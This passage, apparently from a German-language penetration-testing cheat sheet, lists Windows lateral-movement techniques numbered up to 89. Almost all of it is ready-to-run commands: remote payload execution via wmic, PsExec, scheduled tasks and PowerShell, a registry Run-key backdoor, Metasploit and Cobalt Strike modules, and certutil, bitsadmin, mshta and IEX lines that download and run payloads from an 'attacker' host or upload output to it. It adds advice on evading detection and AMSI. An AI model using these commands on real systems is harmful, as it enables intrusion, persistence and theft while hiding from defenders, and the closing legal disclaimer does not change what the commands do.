wmic /node:192.168.1.10 /user:domain\user /password:password process call create "C:\temp\payload.exe"

# Methode 2: Copy + PsExec
copy payload.exe \\192.168.1.10\C$\temp\
psexec.exe \\192.168.1.10 -u domain\user -p password C:\temp\payload.exe

# Methode 3: Copy + Scheduled Task
copy payload.exe \\192.168.1.10\C$\temp\
schtasks /create /tn "Task" /tr "C:\temp\payload.exe" /sc once /st 00:00 /S 192.168.1.10 /U domain\user /P password
schtasks /run /tn "Task" /S 192.168.1.10 /U domain\user /P password
```

### 76. PowerShell Copy-Item
```powershell
# Remote Copy via SMB
$cred = Get-Credential
Copy-Item -Path C:\payload.exe -Destination \\192.168.1.10\C$\temp\ -Credential $cred

# Dann: Remote Execution via WMI/PS Remoting
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "C:\temp\payload.exe" -ComputerName 192.168.1.10 -Credential $cred
```

### 77. reg (Remote Registry für Backdoor)
```cmd
# Remote Registry Service starten
sc \\192.168.1.10 config RemoteRegistry start= auto
sc \\192.168.1.10 start RemoteRegistry

# Registry Backdoor (z.B. Run Key)
reg add \\192.168.1.10\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\payload.exe"
```

---

## Red Team Frameworks

### 78. Cobalt Strike (Beacon)
```
# Jump Methoden:
jump psexec target Beacon
jump psexec64 target Beacon
jump winrm target Beacon
jump winrm64 target Beacon

# Remote Exec:
remote-exec psexec target command
remote-exec wmi target command
remote-exec winrm target command

# Spawn Beacon:
spawn target arch listener

# Pass-the-Hash:
pth domain\user ntlmhash
```

### 79. Metasploit (Lateral Movement Modules)
```ruby
# PsExec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser admin
set SMBPass password
set PAYLOAD windows/meterpreter/reverse_tcp
run

# SMBExec
use exploit/windows/smb/smb_delivery

# WMI
use exploit/windows/local/wmi

# Pass-the-Hash
use exploit/windows/smb/psexec
set SMBUser admin
set SMBPass 00000000000000000000000000000000:NTLMHASH
run
```

### 80. Sliver (C2)
```
# Pivoting via Sliver
pivots

# Lateral Movement
psexec -u user -p password target

# WMIC
wmiexec target command
```

### 81. Empire/Starkiller
```powershell
# Lateral Movement Modules
usemodule lateral_movement/invoke_psexec
usemodule lateral_movement/invoke_wmi
usemodule lateral_movement/invoke_smbexec
usemodule lateral_movement/invoke_dcom
```

---

## Living Off The Land

### 82. BITSAdmin (Background Transfer)
```cmd
# Lateral Movement via BITS (copy payload)
bitsadmin /transfer job /download /priority high \\attacker\share\payload.exe C:\temp\payload.exe
bitsadmin /transfer job /upload /priority high C:\output.txt \\attacker\share\output.txt
```

### 83. certutil (Download)
```cmd
# Remote Download (Lateral Movement vorbereitend)
certutil.exe -urlcache -split -f http://attacker/payload.exe C:\temp\payload.exe
```

### 84. PowerShell Download + Execute
```powershell
# IEX Download + Execute (Fileless)
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock {
    IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
}
```

### 85. mshta (HTML Application)
```cmd
# Remote Execution via mshta
mshta.exe http://attacker/payload.hta

# Via WMI remote:
wmic /node:192.168.1.10 /user:user /password:pass process call create "mshta.exe http://attacker/payload.hta"
```

### 86. rundll32 (DLL Execution)
```cmd
# Copy DLL + Execute
copy payload.dll \\192.168.1.10\C$\temp\
wmic /node:192.168.1.10 /user:user /password:pass process call create "rundll32.exe C:\temp\payload.dll,EntryPoint"
```

---

## Covert Channels

### 87. DNS Tunneling (Lateral Movement via DNS)
```bash
# iodine / dnscat2
# Nicht direkt Lateral Movement, aber Exfil/C2 über DNS für Stealth
```

### 88. ICMP Tunneling
```bash
# icmpsh / ptunnel
# Command via ICMP Packets
```

### 89. HTTP/HTTPS Tunneling
```bash
# reGeorg / Neo-reGeorg
# SOCKS Proxy via HTTP
```

---

## Best Practices & OPSEC

### Stealth Considerations:

1. **WMI > PsExec**: Weniger Artefakte auf Disk
2. **Pass-the-Hash > Plaintext**: Keine Credentials im Commandline
3. **Kerberos > NTLM**: Weniger Logs, bessere Stealth
4. **Named Pipe Impersonation**: Keine Network Auth
5. **Token Theft > New Logon**: Keine Event ID 4624

### Detection Vermeiden:

- **Kein psexec.exe Service Name**: Nutze smbexec/wmiexec
- **Keine ADMIN$ Writes**: Nutze WMI/WinRM
- **PowerShell Logging**: Obfuscation, AMSI Bypass
- **Sysmon Event ID 10**: LSASS Access Detection
- **Windows Event 4688**: Process Creation Logging

### Tool Rotation:

- Verschiedene Techniken verwenden
- Native Tools bevorzugen (LOLBAS)
- Timing variieren (kein sofortiges Lateral Movement)

---

## Zusammenfassung: Empfohlene Tools

### Von Linux/Kali:
1. **Impacket Suite** (psexec.py, wmiexec.py, smbexec.py)
2. **CrackMapExec** (All-in-One)
3. **evil-winrm** (WinRM)
4. **xfreerdp** (RDP)
5. **ssh** (Linux Targets)

### Von Windows:
1. **PowerShell Remoting** (Enter-PSSession, Invoke-Command)
2. **PsExec** (Sysinternals)
3. **wmic** (Native)
4. **Mimikatz** (Pass-the-Hash/Ticket)
5. **Rubeus** (Kerberos)

### Framework/C2:
1. **Cobalt Strike** (Beacon lateral movement)
2. **Metasploit** (exploit/windows/smb/psexec)
3. **Sliver** (Modern C2)

---

## Rechtliche Hinweise

Diese Methoden dürfen NUR verwendet werden für:
- Autorisierte Penetrationstests mit schriftlicher Genehmigung
- CTF-Wettbewerbe und Security Challenges
- Sicherheitsforschung in kontrollierten Umgebungen
- Red Team Assessments mit Scope
- Defensive Security und Detection Engineering

Unbefugte Nutzung verstößt gegen CFAA (USA), Computer Misuse Act (UK), StGB §202a-c (DE) und ähnliche Gesetze weltweit.

---

**Erstellt**: 2025-10-30
**Kontext**: Autorisierter Penetrationstest / OSCP Vorbereitung
**Total Methods**: 89+ Techniken
